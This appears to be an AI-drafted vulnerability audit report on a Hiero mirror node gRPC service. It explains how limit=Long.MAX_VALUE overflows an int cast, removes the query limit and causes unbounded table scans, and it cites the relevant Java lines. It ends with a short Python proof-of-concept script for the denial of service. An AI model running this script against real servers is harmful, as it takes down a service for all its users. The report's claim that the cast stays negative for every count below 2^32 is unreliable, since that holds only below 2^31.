I have verified every step of the claimed vulnerability against the actual source code. All code references check out.

---

Audit Report

## Title
Integer Overflow in `PollingTopicMessageRetriever.poll()` Causes Unbounded Database Query via `limit=Long.MAX_VALUE`

## Summary
A narrowing cast from `long` to `int` in `PollingTopicMessageRetriever.poll()` overflows when a user supplies `limit = Long.MAX_VALUE` via the unauthenticated gRPC `subscribeTopic` endpoint. The overflow produces `pageSize = -1`, which causes `TopicMessageRepositoryCustomImpl.findByFilter()` to skip `setMaxResults`, issuing a full table scan of `topic_message` on every poll cycle.

## Finding Description

**Step 1 — No upper-bound on limit at ingestion.**

`ConsensusController.toFilter()` maps the protobuf `uint64` limit field directly to `TopicMessageFilter.limit` with no cap: [1](#0-0) 

`TopicMessageFilter` only enforces `@Min(0)`, which `Long.MAX_VALUE` satisfies: [2](#0-1) 

The `@Validated` annotation on `TopicMessageFilter` is on a non-Spring-managed value object and has no runtime effect; no validator is invoked during `filter.build()`.

**Step 2 — Integer overflow in `poll()`.** [3](#0-2) 

With `filter.getLimit() = Long.MAX_VALUE` and `context.getTotal().get() = 0`:
- `filter.hasLimit()` → `Long.MAX_VALUE > 0` → `true`
- `(int)(Long.MAX_VALUE - 0)` = `(int)(0x7FFFFFFFFFFFFFFF)` = lower 32 bits = `0xFFFFFFFF` = **`-1`**
- `Math.min(-1, maxPageSize)` = **`-1`** (maxPageSize is always positive)

This persists across all subsequent polls: for any `total` value N < 2³², `(int)(Long.MAX_VALUE - N)` = `0xFFFFFFFF - N`, which is always negative.

**Step 3 — Poisoned `pageSize = -1` written into `newFilter`.** [4](#0-3) 

**Step 4 — `setMaxResults` never called.**

In `TopicMessageRepositoryCustomImpl.findByFilter()`: [5](#0-4) 

`hasLimit()` returns `limit > 0`: [6](#0-5) 

`-1 > 0` is `false`, so `setMaxResults` is never called. The JPA query executes with no `LIMIT` clause, and `getResultList()` materializes the entire result set in memory: [7](#0-6) 

**Step 5 — `isComplete()` does not terminate the loop.** [8](#0-7) 

`filter.hasLimit()` is `true` (original filter, `Long.MAX_VALUE > 0`), but `filter.getLimit() == total.get()` is `Long.MAX_VALUE == N` which is never true in practice. For throttled mode, if the unbounded result set returns ≥ `maxPageSize` rows, `pageSize.get() < maxPageSize` is also `false`, so `isComplete()` returns `false` and polling continues indefinitely.

**Step 6 — `flux.take(filter.getLimit())` is effectively unlimited.**

In `TopicMessageServiceImpl.subscribeTopic()`: [9](#0-8) 

`flux.take(Long.MAX_VALUE)` imposes no practical bound.

## Impact Explanation
Each poll cycle issues a full table scan of `topic_message` for the given `topic_id` with no row limit. On a topic with millions of messages, this saturates database I/O and exhausts JVM heap (the result is fully materialized via `getResultList()`). The default `retrieverProperties.getTimeout()` bounds a single subscription, but multiple concurrent attacker connections multiply the effect and can degrade or crash the mirror node for all subscribers.

## Likelihood Explanation
The `subscribeTopic` gRPC endpoint requires no authentication. Any network-reachable client can send a `ConsensusTopicQuery` with `limit = 9223372036854775807` (`Long.MAX_VALUE`). The protobuf field is `uint64`, making this a valid wire value. The attack is trivially scriptable and requires zero privileges.

## Recommendation
1. **Cap the limit at ingestion** in `ConsensusController.toFilter()` — reject or clamp any `limit` exceeding a configured maximum (e.g., `Integer.MAX_VALUE` or a smaller operational bound).
2. **Use a safe cast** in `PollingTopicMessageRetriever.poll()` — replace `(int)(filter.getLimit() - context.getTotal().get())` with `Math.toIntExact(...)` (throws on overflow) or `(int) Math.min(remaining, Integer.MAX_VALUE)`.
3. **Validate `hasLimit()` semantics** — `hasLimit()` should return `false` only for `limit == 0` (meaning "no limit"), not for any negative value. After the safe cast, a negative `pageSize` should be treated as a logic error and rejected.

## Proof of Concept
```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from com.hederahashgraph.api.proto.java import consensus_topic_query_pb2

channel = grpc.insecure_channel("mirror-node:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_topic_query_pb2.ConsensusTopicQuery(
    topicID=...,          # any valid topic with messages
    limit=9223372036854775807  # Long.MAX_VALUE
)

# Each message received triggers a full table scan of topic_message
for response in stub.subscribeTopic(query):
    print(response)
```

With `limit = Long.MAX_VALUE`:
- `(int)(Long.MAX_VALUE)` = `-1` → `pageSize = -1`
- `newFilter.hasLimit()` = `false` → no `setMaxResults`
- Full `topic_message` scan per poll cycle, result materialized in JVM heap

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L55-57)
```java
    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());

```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-26)
```java
    @Min(0)
    private long limit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L68-71)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L75-75)
```java
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L51-53)
```java
        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L60-60)
```java
        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L83-85)
```java
        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```
